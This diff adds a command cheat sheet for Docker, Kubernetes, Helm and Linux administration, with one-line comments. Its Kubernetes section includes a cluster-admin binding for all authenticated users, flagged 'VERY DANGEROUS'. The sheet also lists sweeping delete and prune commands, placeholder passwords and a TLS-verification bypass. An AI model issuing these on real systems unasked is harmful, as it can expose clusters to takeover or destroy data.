@@ -1,0 +1,910 @@
+# ============================================
+# DOCKER (150 commands)
+# ============================================
+docker ps # List running containers
+docker ps -a # List all containers (including stopped)
+docker ps -q # Only container IDs
+docker ps --filter status=exited # Filter stopped containers
+docker ps --filter name=web # Filter by name
+docker ps --format "table {{.Names}}\t{{.Status}}" # Custom output format
+docker images # List all images
+docker images -a # List all images (including intermediate)
+docker images -q # Only image IDs
+docker images --filter dangling=true # Show untagged images
+docker pull nginx:latest # Pull an image from registry
+docker pull alpine:3.19 # Pull specific version
+docker pull --platform linux/amd64 ubuntu # Pull specific platform
+docker build -t myapp:latest . # Build image from Dockerfile
+docker build --no-cache -t myapp:latest . # Build without cache
+docker build -f Dockerfile.dev -t myapp:dev . # Build with alternate Dockerfile
+docker build --build-arg VERSION=1.0 -t myapp . # Build with build args
+docker build --target builder -t myapp:builder . # Build specific stage
+docker run -d --name web -p 8080:80 nginx # Run container in background with port mapping
+docker run -it --rm alpine sh # Run interactive container, remove after exit
+docker run -d --name db -e MYSQL_ROOT_PASSWORD=secret mysql:8 # Run MySQL with env var
+docker run -d --name postgres -e POSTGRES_PASSWORD=secret postgres:15 # Run Postgres
+docker run -v /host/data:/container/data myapp # Mount host directory
+docker run -v app-vol:/data myapp # Mount named volume
+docker run --restart unless-stopped -d nginx # Auto-restart container
+docker run --memory="512m" --cpus="1" nginx # Limit resources
+docker run --network host nginx # Use host network
+docker run --entrypoint /bin/sh myapp -c "echo hello" # Override entrypoint
+docker run --rm -v $(pwd):/app -w /app node:18 node script.js # Run node script
+docker exec -it web bash # Open shell in running container
+docker exec web ls -la /app # Run command in container
+docker exec -it postgres psql -U postgres # Connect to Postgres in container
+docker exec -it mysql mysql -u root -psecret # Connect to MySQL
+docker exec -it web python manage.py migrate # Run Django migration
+docker exec -d web touch /tmp/healthy # Run detached command
+docker exec -it redis redis-cli # Connect to Redis
+docker logs -f web # Stream container logs
+docker logs --tail 100 web # Last 100 log lines
+docker logs --since 2025-01-01T00:00:00 web # Logs since timestamp
+docker logs --until 2025-01-02T00:00:00 web # Logs until timestamp
+docker inspect web # Detailed container info in JSON
+docker inspect -f '{{.State.Pid}}' web # Extract specific field
+docker inspect --format='{{.NetworkSettings.IPAddress}}' web # Get IP address
+docker inspect --format='{{json .State}}' web | jq # Pretty print state
+docker top web # Show container processes
+docker stats # Live resource usage
+docker stats --all # All containers resource usage
+docker stats --no-stream # One-shot stats snapshot
+docker cp ./index.html web:/usr/share/nginx/html/ # Copy file to container
+docker cp web:/app/logs ./logs # Copy file from container
+docker cp -a web:/data ./data # Copy with archive mode
+docker stop web # Stop running container
+docker stop -t 30 web # Stop with 30s timeout
+docker start web # Start a stopped container
+docker restart web # Restart container
+docker pause web # Pause container processes
+docker unpause web # Resume container
+docker rm web # Remove stopped container
+docker rm -f web # Force remove running container
+docker rm -v web # Remove container and its volumes
+docker rm $(docker ps -aq) # Remove all stopped containers
+docker rmi myapp:latest # Remove an image
+docker rmi -f myapp # Force remove image
+docker rmi $(docker images -f "dangling=true" -q) # Remove dangling images
+docker tag myapp myrepo/myapp:v1.0 # Tag an image
+docker push myrepo/myapp:v1.0 # Push image to registry
+docker push --all-tags myrepo/myapp # Push all tags
+docker login # Login to Docker Hub
+docker login registry.example.com # Login to private registry
+docker logout # Logout
+docker save myapp:latest -o myapp.tar # Export image as tar
+docker save myapp:latest | gzip > myapp.tar.gz # Export and compress
+docker load -i myapp.tar # Import image from tar
+docker export web -o web.tar # Export container filesystem
+docker import web.tar myapp:imported # Import as new image
+docker commit web myapp:patch1 # Create image from container changes
+docker commit -c 'CMD ["app"]' web myapp:custom # Commit with config change
+docker history nginx:latest # Show image layers
+docker history --no-trunc nginx # Full layer commands
+docker network ls # List networks
+docker network create my-net # Create custom bridge network
+docker network create --driver bridge --subnet 172.20.0.0/16 my-net # Create with subnet
+docker network create --driver overlay --attachable my-overlay # Overlay network (swarm)
+docker network connect my-net web # Connect container to network
+docker network disconnect my-net web # Disconnect
+docker network inspect my-net # Inspect network
+docker network prune -f # Remove unused networks
+docker network rm my-net # Remove specific network
+docker volume ls # List volumes
+docker volume create app-data # Create named volume
+docker volume create --driver local --opt type=nfs --opt device=/nfs app-nfs # Create NFS volume
+docker volume inspect app-data # Inspect volume
+docker volume prune -f # Remove unused volumes
+docker volume rm app-data # Remove specific volume
+docker system df # Show disk usage
+docker system prune -a # Remove all unused objects
+docker system prune -a --volumes # Remove everything including volumes
+docker system events # Show real-time events
+docker system info # Docker system information
+docker attach web # Attach to container's STDOUT/STDERR
+docker diff web # Show filesystem changes
+docker wait web # Block until container stops
+docker kill web # Force stop container (SIGKILL)
+docker kill --signal=SIGTERM web # Send specific signal
+docker port web # Show port mappings
+docker rename web old-web # Rename container
+docker update --cpus 2 --memory 512m web # Update resource limits
+docker update --restart=always web # Update restart policy
+docker search nginx # Search Docker Hub
+docker search --limit 5 nginx # Limit search results
+docker search --filter stars=100 nginx # Filter by stars
+docker version # Docker client and version
+docker version --format '{{.Server.Version}}' # Only server version
+docker context ls # List Docker contexts
+docker context use default # Switch context
+docker context create --docker host=ssh://user@remote remote # Create remote context
+docker manifest inspect nginx:latest # View image manifest
+docker manifest create myrepo/myapp:latest myrepo/myapp:amd64 myrepo/myapp:arm64 # Create multi-arch manifest
+docker container prune -f # Remove all stopped containers
+docker image prune -a -f # Remove all unused images
+docker volume prune -f # Remove all unused volumes
+docker network prune -f # Remove all unused networks
+docker buildx create --name mybuilder # Create buildx builder
+docker buildx use mybuilder # Switch to buildx builder
+docker buildx inspect --bootstrap # Inspect and boot builder
+docker buildx build --platform linux/amd64,linux/arm64 -t myrepo/myapp:multiarch . # Multi-arch build
+docker buildx build --push -t myrepo/myapp:latest . # Build and push multi-arch
+docker scan nginx:latest # Scan image for vulnerabilities (Docker Scout)
+docker scan --file Dockerfile nginx:latest # Scan with Dockerfile
+docker compose up -d # Start services in background
+docker compose up --build # Rebuild and start
+docker compose up --scale web=3 # Scale service on the fly
+docker compose down # Stop and remove services
+docker compose down -v # Also remove volumes
+docker compose down --rmi all # Remove images as well
+docker compose ps # List compose services
+docker compose logs -f # Follow logs of all services
+docker compose logs web --tail=20 # Logs of specific service
+docker compose exec web bash # Execute command in compose service
+docker compose exec -T web ls # Non-interactive exec
+docker compose build # Build or rebuild services
+docker compose build --no-cache # Build without cache
+docker compose restart # Restart services
+docker compose pull # Pull latest images
+docker compose push # Push service images
+docker compose config # Validate and view compose file
+docker compose config --resolve-image-digests # With image digests
+docker compose top # Show running processes
+docker compose events # Stream container events
+docker compose run web npm test # Run one-off command
+docker compose create # Create containers without starting
+docker compose start # Start existing containers
+docker compose stop # Stop services without removing
+docker compose rm # Remove stopped containers
+# Loop: restart all running containers
+for c in $(docker ps -q); do docker restart $c; done
+# Loop: stop all containers
+docker stop $(docker ps -q)
+# Loop: remove all containers
+docker rm $(docker ps -aq)
+# Loop: remove all images with <none> tag
+docker rmi $(docker images -f "dangling=true" -q)
+
+# ============================================
+# KUBERNETES (350 commands)
+# ============================================
+kubectl get pods # List pods in current namespace
+kubectl get pods -A # List all pods across all namespaces
+kubectl get pods -o wide # Show pods with node info
+kubectl get pods -l app=myapp # Filter pods by label
+kubectl get pods --field-selector status.phase=Running # Only running pods
+kubectl get pods --sort-by=.metadata.creationTimestamp # Sort by creation time
+kubectl get pods -o json | jq '.items[].metadata.name' # Extract pod names via jq
+kubectl get pods -w # Watch pods in real time
+kubectl get pods --show-labels # Show pod labels
+kubectl get pods -n kube-system # Get pods in specific namespace
+kubectl describe pod mypod # Detailed pod info
+kubectl describe pod mypod -n myns # Describe in namespace
+kubectl logs mypod # Fetch container logs
+kubectl logs -f mypod # Stream logs
+kubectl logs --tail 50 mypod # Last 50 log lines
+kubectl logs -l app=myapp --all-containers # Logs from all containers of matching pods
+kubectl logs --since=1h mypod # Logs from last hour
+kubectl logs --prefix=true mypod # Add container prefix
+kubectl exec mypod -- ls /app # Run command in pod
+kubectl exec -it mypod -- bash # Interactive shell in pod
+kubectl exec -it mypod -- sh # Shell if bash not available
+kubectl exec -it mypod -c mycontainer -- bash # Specific container
+kubectl port-forward mypod 8080:80 # Local port forward to pod
+kubectl port-forward svc/myapp 8080:80 # Forward to service
+kubectl port-forward deployment/myapp 8080:80 # Forward to deployment
+kubectl port-forward --address 0.0.0.0 svc/myapp 8080:80 # Expose on all interfaces
+kubectl get nodes # List cluster nodes
+kubectl get nodes -o wide # Nodes with details
+kubectl get nodes -l node-role.kubernetes.io/control-plane # Master nodes
+kubectl describe node node-1 # Node details
+kubectl top nodes # Node resource usage
+kubectl top nodes --sort-by=cpu # Sort by CPU usage
+kubectl top pods # Pod resource usage
+kubectl top pods -A --sort-by=cpu # Sort pods by CPU
+kubectl top pods --containers # Show per-container
+kubectl top pods --sort-by=memory # Sort by memory
+kubectl get deployments # List deployments
+kubectl get deployments -A # All deployments
+kubectl get deployment myapp -o yaml # Deployment YAML
+kubectl describe deployment myapp # Deployment details
+kubectl get replicasets # List replica sets
+kubectl get replicasets -l app=myapp # Filter by label
+kubectl get statefulsets # List stateful sets
+kubectl get statefulsets -o wide # With details
+kubectl get daemonsets # List daemon sets
+kubectl get daemonsets -n kube-system # System daemonsets
+kubectl get jobs # List jobs
+kubectl get jobs -w # Watch jobs
+kubectl get cronjobs # List cron jobs
+kubectl get cronjobs -o wide # With schedule details
+kubectl get services # List services
+kubectl get svc -A # All services
+kubectl get svc myapp -o jsonpath='{.spec.clusterIP}' # Get cluster IP
+kubectl describe svc myapp # Service details
+kubectl get endpoints # List endpoints
+kubectl get endpointslices # List endpoint slices
+kubectl get ingress # List ingress rules
+kubectl describe ingress myapp # Ingress details
+kubectl get ingress -o wide # Show addresses
+kubectl get configmaps # List config maps
+kubectl get configmaps myconfig -o yaml # Show configmap data
+kubectl get secrets # List secrets
+kubectl describe secret mysecret # Show secret metadata (not values)
+kubectl get secret mysecret -o jsonpath='{.data.password}' | base64 -d # Decode secret
+kubectl get pv # Persistent volumes
+kubectl get pvc # Persistent volume claims
+kubectl get pvc -A # All PVCs
+kubectl describe pvc data-pvc # PVC details
+kubectl get storageclasses # Storage classes
+kubectl get namespaces # List namespaces
+kubectl create namespace dev # Create namespace
+kubectl delete namespace dev # Delete namespace
+kubectl get events --sort-by=.metadata.creationTimestamp # Recent cluster events
+kubectl get events -w # Watch events
+kubectl get events --field-selector type=Warning # Only warning events
+kubectl get events --all-namespaces | grep -i error # Error events
+kubectl apply -f deployment.yaml # Apply manifest
+kubectl apply -f . # Apply all manifests in directory
+kubectl apply -k ./overlays/prod # Apply Kustomize overlay
+kubectl apply -f https://example.com/manifest.yaml # Apply from URL
+kubectl apply --server-side -f manifest.yaml # Server-side apply
+kubectl delete -f deployment.yaml # Delete resources from manifest
+kubectl delete pod mypod # Delete a pod
+kubectl delete pod mypod --grace-period=0 --force # Force delete pod
+kubectl delete deployment myapp # Delete deployment
+kubectl delete service myapp # Delete service
+kubectl delete all --all # Delete all resources in namespace
+kubectl delete pods -l app=test # Delete pods by label
+kubectl scale deployment myapp --replicas=5 # Scale deployment
+kubectl scale statefulset mydb --replicas=3 # Scale statefulset
+kubectl scale --replicas=0 deployment/myapp # Scale to zero
+kubectl autoscale deployment myapp --min=2 --max=10 --cpu-percent=80 # Create HPA
+kubectl autoscale --cpu-percent=50 --min=1 --max=15 deployment myapp # Alternative
+kubectl rollout status deployment myapp # Watch rollout status
+kubectl rollout status statefulset mydb # Statefulset rollout
+kubectl rollout undo deployment myapp # Rollback last deployment
+kubectl rollout undo deployment myapp --to-revision=3 # Rollback to revision
+kubectl rollout history deployment myapp # Deployment revision history
+kubectl rollout history deployment myapp --revision=2 # Show revision details
+kubectl rollout restart deployment myapp # Restart deployment (rolling)
+kubectl rollout pause deployment myapp # Pause rollout
+kubectl rollout resume deployment myapp # Resume rollout
+kubectl set image deployment myapp *=myimage:v2 # Update image
+kubectl set image deployment/myapp nginx=nginx:1.21 # Specific container
+kubectl set resources deployment myapp -c=myapp --limits=cpu=200m,memory=256Mi # Set limits
+kubectl set resources deployment myapp --requests=cpu=100m,memory=128Mi # Set requests
+kubectl set env deployment myapp DB_HOST=prod-db # Update environment variables
+kubectl set env deployment myapp --list # List env vars
+kubectl set env deployment myapp KEY- # Remove env var
+kubectl set serviceaccount deployment myapp my-sa # Change service account
+kubectl set selector svc myapp 'app=web' # Update service selector
+kubectl create deployment myapp --image=myimage --dry-run=client -o yaml > deploy.yaml # Generate YAML
+kubectl create deployment myapp --image=myimage --replicas=3 # Create deployment directly
+kubectl create job myjob --image=busybox -- echo "hello" # Create job
+kubectl create job myjob --from=cronjob/mycron # Create job from cronjob
+kubectl create cronjob mycron --image=busybox --schedule="*/5 * * * *" -- date # Create cronjob
+kubectl create configmap app-config --from-file=config.yaml # Configmap from file
+kubectl create configmap app-config --from-literal=key=value # Configmap from literal
+kubectl create configmap app-config --from-env-file=env.txt # From env file
+kubectl create secret generic mysecret --from-literal=password=s3cret # Create secret
+kubectl create secret generic mysecret --from-file=creds.json # From file
+kubectl create secret tls my-tls --cert=cert.pem --key=key.pem # TLS secret
+kubectl create secret docker-registry regcred --docker-username=user --docker-password=pass # Registry auth
+kubectl create serviceaccount my-sa # Create service account
+kubectl create role pod-reader --verb=get,list --resource=pods # Create role
+kubectl create rolebinding pod-reader --role=pod-reader --serviceaccount=default:my-sa # Bind role
+kubectl create clusterrole secret-reader --verb=get --resource=secrets # Cluster role
+kubectl create clusterrolebinding secret-reader --clusterrole=secret-reader --user=john # Bind cluster role
+kubectl create priorityclass high-priority --value=1000 # Priority class
+kubectl create quota my-quota --hard=cpu=4,memory=8Gi,pods=10 # Resource quota
+kubectl create limitrange my-limits --limits=pod=2,container=1 --default=cpu=200m,memory=256Mi # Limit range
+kubectl run test --image=busybox --restart=Never -- sleep 3600 # Run a pod
+kubectl run test --image=nginx --port=80 # Run nginx pod
+kubectl run test --image=busybox --restart=Never --dry-run=client -o yaml > pod.yaml # Generate pod YAML
+kubectl expose deployment myapp --type=LoadBalancer --port=80 --target-port=8080 # Expose service
+kubectl expose pod mypod --port=80 --target-port=8080 --name=my-svc # Expose pod
+kubectl expose deployment myapp --type=NodePort --port=80 --name=myapp-nodeport # NodePort service
+kubectl patch deployment myapp -p '{"spec":{"replicas":3}}' # Patch deployment replicas
+kubectl patch service myapp -p '{"spec":{"type":"NodePort"}}' # Patch service type
+kubectl patch node node-1 -p '{"spec":{"unschedulable":true}}' # Cordon node via patch
+kubectl patch pvc mypvc -p '{"spec":{"resources":{"requests":{"storage":"10Gi"}}}}' # Resize PVC
+kubectl edit deployment myapp # Edit live object
+kubectl edit svc myapp --output-patch # Show patch after edit
+kubectl label pod mypod env=prod # Add label
+kubectl label pod mypod env- # Remove label
+kubectl label node worker-1 disktype=ssd --overwrite # Overwrite label
+kubectl annotate pod mypod description="web frontend" # Add annotation
+kubectl annotate pod mypod description- # Remove annotation
+kubectl explain pod.spec.containers # Show field docs
+kubectl explain --recursive deployment # Recursive docs
+kubectl config view # View kubeconfig
+kubectl config get-contexts # List contexts
+kubectl config current-context # Show current context
+kubectl config use-context my-context # Switch context
+kubectl config set-context --current --namespace=dev # Set default namespace
+kubectl config set-credentials devuser --username=dev --password=pass # Add user
+kubectl config set-credentials devuser --client-certificate=cert.pem --client-key=key.pem # Client cert
+kubectl config set-cluster dev --server=https://dev.k8s.local --insecure-skip-tls-verify # Add cluster
+kubectl config set-context dev --cluster=dev --user=devuser --namespace=dev # Create context
+kubectl config delete-context dev # Delete context
+kubectl config unset current-context # Unset context
+kubectl auth can-i create pods # Check current user permissions
+kubectl auth can-i create pods --as=system:serviceaccount:default:my-sa # As service account
+kubectl auth can-i --list --as=admin # List permissions
+kubectl auth reconcile -f role.yaml # Reconcile RBAC (safe apply)
+kubectl top pods --containers # Resource usage per container
+kubectl top nodes --no-headers | sort -k4 -n # Sort nodes by memory
+kubectl cp mypod:/var/log/app.log ./ # Copy file from pod
+kubectl cp ./config.yaml mypod:/etc/config.yaml # Copy file to pod
+kubectl cp mypod:/tmp/foo ./foo -c container2 # Copy from specific container
+kubectl cp --retries=3 mypod:/data/file ./file # Retry on failure
+kubectl drain node-1 --ignore-daemonsets --delete-emptydir-data # Drain node
+kubectl drain node-1 --force # Force drain even with unpod controllers
+kubectl cordon node-1 # Mark node unschedulable
+kubectl uncordon node-1 # Unmark node
+kubectl taint nodes node-1 dedicated=experimental:NoSchedule # Add taint
+kubectl taint nodes node-1 dedicated- # Remove taint
+kubectl taint nodes node-1 dedicated=experimental:NoExecute # NoExecute taint
+kubectl taint nodes node-app node-type=app:PreferNoSchedule # PreferNoSchedule
+kubectl proxy # Start API proxy
+kubectl proxy --port=8080 --www=./www # Proxy with static file serving
+kubectl proxy --api-prefix=/api/ # Custom API prefix
+kubectl run debug --rm -it --image=nicolaka/netshoot -- bash # Debugging pod with network tools
+kubectl run debug --rm -it --image=busybox --restart=Never -- nslookup kubernetes # DNS test
+kubectl debug node/node-1 -it --image=busybox # Debug node via pod (v1.20+)
+kubectl debug mypod -it --image=busybox --target=container1 # Ephemeral container
+kubectl certificate approve csr-name # Approve CSR
+kubectl certificate deny csr-name # Deny CSR
+kubectl get csr # List certificate signing requests
+kubectl get csr -o wide # Show requestor
+kubectl wait --for=condition=Ready pod -l app=myapp # Wait for condition
+kubectl wait --for=condition=complete job/myjob --timeout=60s # Wait for job completion
+kubectl wait --for=delete pod/mypod --timeout=30s # Wait for deletion
+kubectl api-resources # List all API resources
+kubectl api-resources --verbs=list,get # Resources supporting specific verbs
+kubectl api-resources --namespaced=false # Non-namespaced resources
+kubectl api-versions # List API versions
+kubectl cluster-info # Cluster info
+kubectl cluster-info dump # Dump cluster state for debugging
+kubectl get pod mypod -o yaml # Pod YAML output
+kubectl get pod mypod -o json # Pod JSON output
+kubectl get pod mypod -o jsonpath='{.spec.containers[0].image}' # Extract with jsonpath
+kubectl get deploy myapp -o go-template='{{.spec.replicas}}' # Go template extraction
+kubectl get pods -o custom-columns=NAME:.metadata.name,STATUS:.status.phase,NODE:.spec.nodeName # Custom columns
+kubectl get pods -o wide --sort-by='.status.podIP' # Sort by pod IP
+kubectl get all -l app=myapp # Get all resources with label
+kubectl get pv,pvc,sc # Multiple resource types
+kubectl get --raw="/api/v1/nodes" | jq # Query API directly
+kubectl get --raw="/metrics" # Fetch metrics (if enabled)
+kubectl get componentstatuses # Control plane components (deprecated)
+kubectl get leases -n kube-system # Leader election leases
+kubectl get endpointslices -n default # Endpoint slices
+kubectl get csidrivers # CSI drivers
+kubectl get csinodes # CSI nodes
+kubectl get volumeattachments # Volume attachments
+kubectl get mutatingwebhookconfigurations # Mutating webhooks
+kubectl get validatingwebhookconfigurations # Validating webhooks
+kubectl get apiservices # API services
+kubectl get priorityclasses # Priority classes
+kubectl get resourcequotas # Resource quotas
+kubectl get limitranges # Limit ranges
+kubectl get networkpolicies # Network policies
+kubectl get poddisruptionbudgets # PDBs
+kubectl get hpa # Horizontal pod autoscalers
+kubectl get hpa -A --sort-by='.status.currentCPUUtilizationPercentage' # Sort HPA by CPU
+kubectl describe hpa myapp # HPA details
+kubectl create token my-sa # Create token for service account
+kubectl create token my-sa --duration=24h # Token with duration
+kubectl get pods --no-headers | wc -l # Count pods
+kubectl get pv --sort-by=.spec.capacity.storage # Sort PVs by size
+kubectl get svc -o custom-columns='NAME:.metadata.name,TYPE:.spec.type,CLUSTER-IP:.spec.clusterIP,PORTS:.spec.ports[*].port' # Custom service info
+kubectl get pods -o jsonpath='{range .items[*]}{.spec.containers[*].image}{"\n"}{end}' # All images
+kubectl get events --sort-by='.lastTimestamp' # Sort by timestamp
+kubectl get events --all-namespaces --field-selector involvedObject.kind=Pod # Pod-only events
+kubectl plugin list # List installed plugins
+kubectl krew list # List Krew plugins (if Krew installed)
+kubectl krew install tree # Install Krew plugin
+kubectl tree deployment myapp # Show resource ownership tree
+kubectl get ns # Shortcut for namespaces
+kubectl get cm # Shortcut for configmaps
+kubectl get secret # Shortcut for secrets
+# Loop over all pods and describe each
+for pod in $(kubectl get pods -o name); do kubectl describe $pod | grep Image; done
+# Restart all deployments in a namespace
+for deploy in $(kubectl get deployments -o name); do kubectl rollout restart $deploy; done
+# Get all image names in pods
+kubectl get pods -o jsonpath='{range .items[*]}{.spec.containers[*].image}{"\n"}{end}'
+kubectl get pods -l app=myapp -o name | xargs -I {} kubectl exec {} -- whoami # Run on all matching
+kubectl get pods -l app=myapp -o name | xargs kubectl delete # Delete all matching
+kubectl label nodes --all node-role.kubernetes.io/worker= # Label all nodes as worker
+kubectl taint nodes --all node-role.kubernetes.io/master- # Remove master taint
+kubectl cordon --all # Cordon all nodes
+kubectl uncordon --all # Uncordon all nodes
+kubectl get nodes -o jsonpath='{range .items[*]}{.metadata.name}{"\t"}{.status.conditions[?(@.type=="Ready")].status}{"\n"}{end}' # Node ready status
+kubectl get pods --field-selector status.phase=Pending # Show pending pods
+kubectl get pods --field-selector status.phase=Failed # Show failed pods
+kubectl get csr -o json | jq '.items[] | select(.status.certificate == null) | .metadata.name' # Pending CSRs
+kubectl get hpa -o json | jq '.items[] | {name: .metadata.name, min: .spec.minReplicas, max: .spec.maxReplicas, current: .status.currentReplicas}' # HPA summary
+kubectl get crd # Custom resource definitions
+kubectl get crd | grep cert-manager # Filter CRDs
+kubectl get clusterrolebinding cluster-admin -o yaml # Show cluster-admin bindings
+kubectl auth can-i --list --namespace=default # List permissions in namespace
+kubectl proxy --port=8001 --www=. --www-prefix=/static/ # Serve static files via proxy
+kubectl run tmp --image=alpine --restart=Never --rm -it -- curl -s http://myapp-svc # One-shot curl
+kubectl create clusterrolebinding permissive-binding --clusterrole=cluster-admin --group=system:authenticated # VERY DANGEROUS
+kubectl create rolebinding edit-binding --clusterrole=edit --user=jane --namespace=dev # Give edit role
+kubectl get pod -o=jsonpath='{range .items[*]}{.metadata.name}{"\t"}{.status.podIP}{"\n"}{end}' # Pod IPs only
+kubectl get pod -o=jsonpath='{range .items[*]}{.metadata.labels}{"\n"}{end}' # Pod labels
+kubectl get deployment -o=go-template='{{range .items}}{{.metadata.name}}{{"\n"}}{{end}}' # Deployment names
+helm list --all-namespaces # List all Helm releases
+helm list --deployed # Only deployed releases
+helm history myapp # Show release history
+helm rollback myapp 1 # Rollback to revision 1
+helm uninstall myapp -n myapp # Uninstall Helm release
+helm repo add bitnami https://charts.bitnami.com/bitnami # Add Helm repo
+helm repo update # Update repo index
+helm search repo nginx # Search repos
+helm search hub nginx # Search Artifact Hub
+helm template myrelease ./chart # Render template locally
+helm lint ./chart # Lint chart
+helm package ./chart # Package chart into .tgz
+helm dependency update ./chart # Update chart dependencies
+helm dependency build ./chart # Rebuild dependencies
+helm get manifest myrelease # Get generated manifests
+helm get values myrelease # Get release values
+helm show values bitnami/nginx # Show default values of chart
+helm upgrade --install myrelease ./chart # Install or upgrade
+kustomize create --autodetect # Auto-generate kustomization.yaml
+kustomize edit set image nginx=nginx:1.22 # Change image in kustomization
+kustomize edit add resource deployment.yaml # Add resource to kustomization
+kustomize edit add patch --path replica-patch.yaml # Add patch to kustomization
+kustomize edit set namespace mynamespace # Set namespace for all resources
+kustomize build ./overlays/prod | kubectl apply -f - # Build and apply
+kubectl kustomize ./overlays/prod > prod-manifest.yaml # Render Kustomize overlay to file
+kubectl apply -k kustomize/overlays/prod # Deploy using Kustomize
+kind create cluster --name dev # Create local kind cluster
+kind delete cluster --name dev # Delete kind cluster
+minikube start --cpus=4 --memory=8192 # Start minikube with resources
+minikube stop # Stop minikube
+minikube delete # Delete minikube cluster
+minikube dashboard # Open Kubernetes dashboard
+minikube addons list # List minikube addons
+minikube addons enable ingress # Enable ingress addon
+minikube ssh # SSH into minikube node
+
+# ============================================
+# LINUX / BASH (200 commands)
+# ============================================
+ls -lah # List all files with details
+ls -latr # List sorted by modification time reverse
+ls -R # Recursive listing
+ls -lS # Sort by file size
+pwd # Print current directory
+cd /var/log # Change directory
+cd - # Go to previous directory
+cd ~ # Go to home directory
+mkdir -p /opt/app/logs # Create directory tree
+mkdir -m 755 newdir # Create with permissions
+rm -rf /tmp/old # Force remove directory
+rm -i file.txt # Interactive removal
+rmdir empty_dir # Remove empty directory
+cp -r /src /dest # Copy directory
+cp -v file.txt file.bak # Verbose copy
+cp -u source dest # Copy only newer files
+mv file.txt /newdir/ # Move or rename
+mv -i file.txt /newdir/ # Interactive move
+touch newfile.txt # Create empty file
+touch -t 202501011200 file.txt # Set specific timestamp
+find / -name nginx.conf 2>/dev/null # Locate file by name
+find /var/log -type f -mtime +7 -exec rm {} \; # Delete old log files
+find . -type f -size +100M # Find files larger than 100MB
+find . -type d -empty # Find empty directories
+grep -r "error" /var/log/ # Recursive search
+grep -i "error" syslog # Case-insensitive search
+grep -E "error|warn" syslog # Extended regex
+grep -v "success" syslog # Invert match
+grep -c "error" syslog # Count matches
+tail -f /var/log/syslog # Live tail
+tail -n 50 syslog # Last 50 lines
+head -n 20 syslog # First 20 lines
+less /var/log/dmesg # Interactive log viewer
+cat /etc/hostname # Print file content
+cat file1 file2 > combined.txt # Concatenate files
+tac file.txt # Reverse line order
+echo "hello world" # Print to terminal
+echo -n "no newline" # Print without newline
+echo -e "line1\nline2" # Enable escape sequences
+chmod +x script.sh # Make script executable
+chmod 755 script.sh # Octal permissions
+chmod -R 644 *.txt # Recursive permissions
+chown -R user:group /data # Recursive owner change
+chown user:group file.txt # Change owner and group
+chgrp group file.txt # Change group only
+df -h # Disk space free
+df -i # Inode usage
+du -sh * # Directory sizes
+du -sh /var/log/ # Size of directory
+du -sh --max-depth=1 # Top level sizes
+free -h # Memory usage
+free -m # Memory in MB
+uptime # System uptime
+uname -a # Kernel info
+lsb_release -a # OS release info
+hostnamectl # System info
+lscpu # CPU info
+lsblk # Block devices
+fdisk -l # List partitions (sudo)
+mount # Show mounted filesystems
+mount /dev/sdb1 /mnt # Mount partition
+umount /mnt # Unmount
+top -b -n1 # Snapshot of top
+htop # Interactive process viewer (install)
+ps aux | grep nginx # Find process
+ps -ef --forest # Process tree
+kill -9 1234 # Force kill process
+kill -15 1234 # Graceful kill
+pkill -f processname # Kill by pattern
+pgrep -fl nginx # List PIDs matching pattern
+killall firefox # Kill by exact name
+systemctl status nginx # Service status
+systemctl start nginx # Start service
+systemctl stop nginx # Stop service
+systemctl restart nginx # Restart service
+systemctl enable nginx # Enable on boot
+systemctl disable nginx # Disable on boot
+systemctl list-units --type=service # List all services
+journalctl -u nginx -f # Follow service logs
+journalctl --since "1 hour ago" # Recent logs
+journalctl --since "2025-01-01" --until "2025-01-02" # Time range
+ip a # Show network interfaces
+ip r # Routing table
+ip neigh # ARP table
+hostname -I # IP addresses
+ss -tulpn # Listening ports (modern)
+ss -tunap # All TCP/UDP connections
+netstat -tulpn # Listening ports (legacy)
+ping -c 4 8.8.8.8 # Ping with count
+ping -i 0.2 google.com # Ping with interval
+traceroute google.com # Trace path
+mtr google.com # Live traceroute
+tracepath google.com # No root required
+curl -I https://example.com # HTTP headers
+curl -X POST -d '{"key":"val"}' -H "Content-Type: application/json" https://api.example.com # POST JSON
+curl -O https://example.com/file.tar.gz # Download with original name
+curl -sS https://example.com # Silent but show errors
+wget -O file.tar.gz https://example.com/file.tar.gz # Download and rename
+wget -r -l 2 https://example.com # Recursive with max level
+wget -c https://example.com/bigfile.zip # Continue partial download
+tar -czf archive.tar.gz /dir # Create gzip tarball
+tar -xzf archive.tar.gz # Extract gzip tarball
+tar -xjf archive.tar.bz2 # Extract bzip2
+tar -xvf archive.tar # Extract tar
+tar -tf archive.tar.gz # List contents
+unzip archive.zip # Extract zip
+unzip -l archive.zip # List contents
+zip -r archive.zip /dir # Create zip
+ln -s /target link # Create symbolic link
+ln -sf /target link # Force overwrite symlink
+alias ll='ls -alF' # Create alias
+unalias ll # Remove alias
+alias # List all aliases
+watch -n 1 'df -h' # Repeated command
+watch -d 'ps aux' # Highlight differences
+date # Current date/time
+date +%Y-%m-%d # Formatted date
+date -d "yesterday" # Relative date
+cal # Calendar
+time command # Measure execution time
+sleep 5 # Sleep for 5 seconds
+whoami # Current user
+id # User and group IDs
+id -u # Just user ID
+groups # Groups of current user
+who # Who is logged in
+last # Recent logins
+lastlog # Last login for each user
+history # Command history
+history 10 # Last 10 commands
+!! # Rerun last command
+!100 # Run command from history line 100
+which python # Locate executable
+whereis python # Locate binary, source, man
+type -a python # Show all occurrences
+locate nginx.conf # Fast filename search (via updatedb)
+updatedb # Update locate database (sudo)
+diff file1 file2 # File differences
+diff -u file1 file2 # Unified diff
+diff -r dir1 dir2 # Recursive diff
+tee -a file.log # Append to file while displaying
+cut -d: -f1 /etc/passwd # Extract field 1
+cut -c 1-10 file.txt # Extract characters
+awk '{print $1}' file.txt # Print column
+awk -F: '{print $1, $3}' /etc/passwd # Custom delimiter
+sed 's/old/new/g' file.txt # Replace globally
+sed -i 's/old/new/g' file.txt # In-place replace
+sed -n '10,20p' file.txt # Print lines 10-20
+sort file.txt # Sort alphabetically
+sort -n file.txt # Numeric sort
+sort -r file.txt # Reverse sort
+uniq file.txt # Deduplicate adjacent
+uniq -c file.txt # Count occurrences
+wc -l file.txt # Line count
+wc -w file.txt # Word count
+wc -c file.txt # Byte count
+tr 'a-z' 'A-Z' < file.txt # Convert to uppercase
+xargs -n 1 echo # Execute with arguments
+find . -name "*.log" -print0 | xargs -0 rm # Safe delete
+cat file.txt | xargs -I {} cp {} /dest/ # Replacement string
+ssh user@remote # SSH connect
+ssh -i key.pem user@remote # Use identity file
+ssh -p 2222 user@remote # Custom port
+ssh -J jumpuser@jumphost user@target # Jump host
+scp file.txt user@remote:/tmp/ # Copy via SSH
+scp -r /dir user@remote:/tmp/ # Recursive copy
